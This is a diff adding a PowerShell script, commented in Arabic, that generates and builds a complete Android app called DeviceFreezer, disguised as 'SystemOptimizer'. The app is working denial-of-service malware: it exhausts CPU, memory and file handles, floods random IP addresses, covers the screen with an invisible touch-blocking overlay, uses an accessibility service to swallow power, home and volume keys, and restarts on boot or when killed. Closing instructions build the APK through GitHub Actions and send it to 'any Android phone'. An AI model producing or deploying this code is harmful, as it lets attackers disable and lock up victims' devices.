@@ -1,0 +1,337 @@
+# ============================================================
+# BuildAPK.ps1 — يبني APK أندرويد فقط (ما يلمس جهازك)
+# ============================================================
+
+# إنشاء مجلد المشروع على سطح المكتب
+$desktop = [Environment]::GetFolderPath("Desktop")
+$projectDir = "$desktop\DeviceFreezer"
+Remove-Item -Path $projectDir -Recurse -Force -ErrorAction SilentlyContinue
+
+# إنشاء هيكل المجلدات
+New-Item -ItemType Directory -Path "$projectDir\.github\workflows" -Force | Out-Null
+New-Item -ItemType Directory -Path "$projectDir\app\src\main\java\com\sec\freezer" -Force | Out-Null
+New-Item -ItemType Directory -Path "$projectDir\app\src\main\res\values" -Force | Out-Null
+New-Item -ItemType Directory -Path "$projectDir\app\src\main\res\xml" -Force | Out-Null
+
+# ============================================
+# كتابة جميع ملفات المشروع
+# ============================================
+
+# build.gradle (project)
+@"
+buildscript {
+    repositories { google(); mavenCentral() }
+    dependencies { classpath 'com.android.tools.build:gradle:8.0.2' }
+}
+allprojects {
+    repositories { google(); mavenCentral() }
+}
+"@ | Out-File -FilePath "$projectDir\build.gradle" -Encoding UTF8
+
+# settings.gradle
+"include ':app'" | Out-File -FilePath "$projectDir\settings.gradle" -Encoding UTF8
+
+# gradle.properties
+@"
+org.gradle.jvmargs=-Xmx2048m
+android.useAndroidX=true
+"@ | Out-File -FilePath "$projectDir\gradle.properties" -Encoding UTF8
+
+# app/build.gradle
+@"
+apply plugin: 'com.android.application'
+android {
+    compileSdk 33
+    defaultConfig {
+        applicationId 'com.sec.freezer'
+        minSdk 21
+        targetSdk 33
+        versionCode 1
+        versionName '1.0'
+    }
+    buildTypes {
+        release { minifyEnabled false }
+    }
+}
+"@ | Out-File -FilePath "$projectDir\app\build.gradle" -Encoding UTF8
+
+# AndroidManifest.xml
+@"
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.sec.freezer">
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <application android:allowBackup="false" android:label="SystemOptimizer"
+        android:theme="@style/Theme.Freezer" android:persistent="true" android:stopWithTask="false">
+        <activity android:name=".MainActivity" android:exported="true"
+            android:excludeFromRecents="true" android:noHistory="true"
+            android:launchMode="singleInstance" android:showOnLockScreen="true"
+            android:showWhenLocked="true" android:turnScreenOn="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <service android:name=".FreezeCore" android:enabled="true" android:exported="false"
+            android:foregroundServiceType="dataSync" android:persistent="true" />
+        <service android:name=".OverlayBlocker" android:enabled="true" android:exported="false" android:persistent="true" />
+        <service android:name=".KeyBlocker" android:enabled="true" android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_config" />
+        </service>
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true" android:persistent="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
+"@ | Out-File -FilePath "$projectDir\app\src\main\AndroidManifest.xml" -Encoding UTF8
+
+# styles.xml
+@"
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <style name="Theme.Freezer" parent="android:Theme.NoDisplay">
+        <item name="android:windowNoTitle">true</item>
+        <item name="android:windowFullscreen">true</item>
+        <item name="android:windowIsTranslucent">true</item>
+        <item name="android:windowBackground">@android:color/transparent</item>
+    </style>
+</resources>
+"@ | Out-File -FilePath "$projectDir\app\src\main\res\values\styles.xml" -Encoding UTF8
+
+# accessibility_config.xml
+@"
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagRequestFilterKeyEvents"
+    android:canPerformGestures="true" android:canRetrieveWindowContent="true"
+    android:canRequestFilterKeyEvents="true" android:canControlMagnification="true"
+    android:notificationTimeout="0" />
+"@ | Out-File -FilePath "$projectDir\app\src\main\res\xml\accessibility_config.xml" -Encoding UTF8
+
+# MainActivity.java
+@"
+package com.sec.freezer;
+import android.app.Activity;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.view.WindowManager;
+public class MainActivity extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
+            WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent);
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent);
+        }
+        Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(accIntent);
+        triggerFullFreeze(); finish();
+    }
+    private void triggerFullFreeze() {
+        Intent freezeIntent = new Intent(this, FreezeCore.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(freezeIntent);
+        else startService(freezeIntent);
+        startService(new Intent(this, OverlayBlocker.class));
+    }
+}
+"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\MainActivity.java" -Encoding UTF8
+
+# FreezeCore.java
+@"
+package com.sec.freezer;
+import android.app.Notification; import android.app.NotificationChannel; import android.app.NotificationManager;
+import android.app.Service; import android.content.Intent; import android.os.Build; import android.os.IBinder; import android.os.PowerManager;
+import java.io.File; import java.io.FileOutputStream; import java.net.HttpURLConnection; import java.net.URL;
+import java.util.ArrayList; import java.util.Random;
+public class FreezeCore extends Service {
+    private PowerManager.WakeLock wakeLock; private volatile boolean running = true;
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK|PowerManager.ACQUIRE_CAUSES_WAKEUP|PowerManager.ON_AFTER_RELEASE, "FREEZE");
+        wakeLock.acquire();
+        createNotificationChannel();
+        Notification n = new Notification.Builder(this, "ch").setContentTitle("تحسين النظام")
+            .setContentText("جاري تحسين أداء الجهاز...").setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setOngoing(true).setPriority(Notification.PRIORITY_MAX).build();
+        startForeground(Integer.MAX_VALUE, n);
+    }
+    @Override
+    public int onStartCommand(Intent i, int f, int sid) {
+        running = true;
+        int cores = Runtime.getRuntime().availableProcessors();
+        for (int c = 0; c < cores * 3; c++) { new Thread(() -> { while (running) {
+            double x = 0; for (int j = 0; j < 500000; j++) {
+                x += Math.sin(j*Math.PI)*Math.cos(j*Math.E)*Math.tan(j*Math.sqrt(2));
+                x = Math.pow(x,0.5); x = Math.log(Math.abs(x)+1); x += new String(new char[100000]).hashCode(); }
+        }}).start(); }
+        new Thread(() -> { ArrayList<byte[]> m = new ArrayList<>(); try { while (running) {
+            byte[] b = new byte[50*1024*1024]; new Random().nextBytes(b); m.add(b); }
+        } catch (OutOfMemoryError e) {} }).start();
+        new Thread(() -> { ArrayList<Object> o = new ArrayList<>(); try { while (running) {
+            for (int j = 0; j < 1000; j++) { o.add(new byte[1024*1024]); o.add(new String(new char[500000]));
+            o.add(new java.util.HashMap<String,String>()); } } } catch (OutOfMemoryError e) {} }).start();
+        new Thread(() -> { ArrayList<FileOutputStream> fh = new ArrayList<>(); try { while (running) {
+            try { File f2 = new File(getCacheDir(), "x_"+System.nanoTime());
+                FileOutputStream fos = new FileOutputStream(f2); fos.write(new byte[1024]); fh.add(fos); } catch (Exception e) {}
+        }} catch (Exception e) {} }).start();
+        for (int k = 0; k < 10; k++) { new Thread(() -> { while (running) { try {
+            URL u = new URL("http://"+(int)(Math.random()*256)+"."+(int)(Math.random()*256)+"."+(int)(Math.random()*256)+"."+(int)(Math.random()*256));
+            HttpURLConnection c = (HttpURLConnection) u.openConnection(); c.setConnectTimeout(100); c.setReadTimeout(100); c.connect(); c.disconnect();
+        } catch (Exception e) { } }}).start(); }
+        return START_STICKY;
+    }
+    @Override public void onDestroy() { running = false; if (wakeLock!=null && wakeLock.isHeld()) wakeLock.release();
+        Intent r = new Intent(this, FreezeCore.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(r); else startService(r); super.onDestroy(); }
+    private void createNotificationChannel() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel("ch", "محسن", NotificationManager.IMPORTANCE_MAX);
+            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch); } }
+    @Override public IBinder onBind(Intent intent) { return null; }
+}
+"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\FreezeCore.java" -Encoding UTF8
+
+# OverlayBlocker.java
+@"
+package com.sec.freezer;
+import android.app.Service; import android.content.Intent; import android.graphics.PixelFormat; import android.graphics.Color;
+import android.os.Build; import android.os.IBinder; import android.view.Gravity; import android.view.MotionEvent;
+import android.view.View; import android.view.WindowManager; import android.widget.FrameLayout;
+public class OverlayBlocker extends Service {
+    private WindowManager wm; private View overlayView;
+    @Override public int onStartCommand(Intent i, int f, int sid) {
+        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+        if (overlayView == null) {
+            overlayView = new FrameLayout(this) { @Override public boolean onTouchEvent(MotionEvent e) { return true; } };
+            overlayView.setBackgroundColor(Color.argb(1,0,0,0)); overlayView.setClickable(true);
+            overlayView.setFocusable(true); overlayView.setFocusableInTouchMode(true);
+            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
+            WindowManager.LayoutParams p = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT, type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE|WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON|
+                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                PixelFormat.TRANSLUCENT);
+            p.gravity = Gravity.TOP|Gravity.START; wm.addView(overlayView, p);
+        } return START_STICKY;
+    }
+    @Override public void onDestroy() { if (overlayView != null) { try { wm.removeView(overlayView); } catch (Exception e) {} overlayView = null; }
+        startService(new Intent(this, OverlayBlocker.class)); super.onDestroy(); }
+    @Override public IBinder onBind(Intent intent) { return null; }
+}
+"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\OverlayBlocker.java" -Encoding UTF8
+
+# KeyBlocker.java
+@"
+package com.sec.freezer;
+import android.accessibilityservice.AccessibilityService; import android.content.Intent; import android.os.Handler;
+import android.provider.Settings; import android.view.KeyEvent; import android.view.accessibility.AccessibilityEvent;
+public class KeyBlocker extends AccessibilityService {
+    private Handler h = new Handler();
+    @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
+    @Override public boolean onKeyEvent(KeyEvent e) {
+        switch (e.getKeyCode()) {
+            case KeyEvent.KEYCODE_POWER: case KeyEvent.KEYCODE_VOLUME_DOWN: case KeyEvent.KEYCODE_VOLUME_UP:
+            case KeyEvent.KEYCODE_HOME: case KeyEvent.KEYCODE_BACK: case KeyEvent.KEYCODE_APP_SWITCH:
+            case KeyEvent.KEYCODE_CAMERA: case KeyEvent.KEYCODE_MENU: case KeyEvent.KEYCODE_SEARCH: return true; }
+        if (e.getAction() == KeyEvent.ACTION_DOWN && e.getRepeatCount() > 5) return true;
+        return super.onKeyEvent(e);
+    }
+    @Override public void onInterrupt() { h.postDelayed(() -> { try {
+        Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(i);
+    } catch (Exception ex) {} }, 1000); }
+    @Override public void onServiceConnected() { super.onServiceConnected(); }
+}
+"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\KeyBlocker.java" -Encoding UTF8
+
+# BootReceiver.java
+@"
+package com.sec.freezer;
+import android.content.BroadcastReceiver; import android.content.Context; import android.content.Intent; import android.os.Build;
+public class BootReceiver extends BroadcastReceiver {
+    @Override public void onReceive(Context c, Intent i) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction()) || Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(i.getAction()) || "android.intent.action.QUICKBOOT_POWERON".equals(i.getAction())) {
+            Intent f = new Intent(c, FreezeCore.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) c.startForegroundService(f); else c.startService(f);
+            c.startService(new Intent(c, OverlayBlocker.class)); } }
+}
+"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\BootReceiver.java" -Encoding UTF8
+
+# GitHub Actions workflow
+@"
+name: Build APK
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - uses: actions/setup-java@v3
+      with: { java-version: '17', distribution: 'temurin' }
+    - uses: android-actions/setup-android@v2
+    - run: |
+        chmod +x gradlew 2>/dev/null || true
+        if [ -f "gradlew" ]; then ./gradlew assembleDebug; else
+          apt-get update -qq && apt-get install -y gradle -qq && gradle wrapper --gradle-version 8.0 && ./gradlew assembleDebug; fi
+    - uses: actions/upload-artifact@v3
+      with:
+        name: DeviceFreezer-APK
+        path: app/build/outputs/apk/debug/app-debug.apk
+"@ | Out-File -FilePath "$projectDir\.github\workflows\build.yml" -Encoding UTF8
+
+# README
+"# Device Freezer APK" | Out-File -FilePath "$projectDir\README.md" -Encoding UTF8
+
+Write-Host ""
+Write-Host "==============================================" -ForegroundColor Green
+Write-Host "  تم إنشاء المشروع بنجاح!" -ForegroundColor Green
+Write-Host "==============================================" -ForegroundColor Green
+Write-Host ""
+Write-Host "المجلد: $projectDir" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "الآن اتبع الآتي:" -ForegroundColor Yellow
+Write-Host "1. اذهب إلى github.com/new وأنشئ مستودع اسمه DeviceFreezer" -ForegroundColor White
+Write-Host "2. ارجع للـ PowerShell وشغل:" -ForegroundColor White
+Write-Host "----------------------------------------" -ForegroundColor Gray
+Write-Host "cd $projectDir" -ForegroundColor Green
+Write-Host "git init" -ForegroundColor Green
+Write-Host "git add ." -ForegroundColor Green
+Write-Host 'git commit -m "first commit"' -ForegroundColor Green
+Write-Host "git branch -M main" -ForegroundColor Green
+Write-Host "git remote add origin https://github.com/YOUR_USERNAME/DeviceFreezer.git" -ForegroundColor Green
+Write-Host "git push -u origin main" -ForegroundColor Green
+Write-Host "----------------------------------------" -ForegroundColor Gray
+Write-Host ""
+Write-Host "3. اذهب إلى مستودعك على GitHub ← تبويب Actions" -ForegroundColor White
+Write-Host "4. انتظر 3-5 دقائق للبناء" -ForegroundColor White
+Write-Host "5. حمّل APK من Artifacts" -ForegroundColor White
+Write-Host "6. أرسل APK لأي هاتف أندرويد" -ForegroundColor White
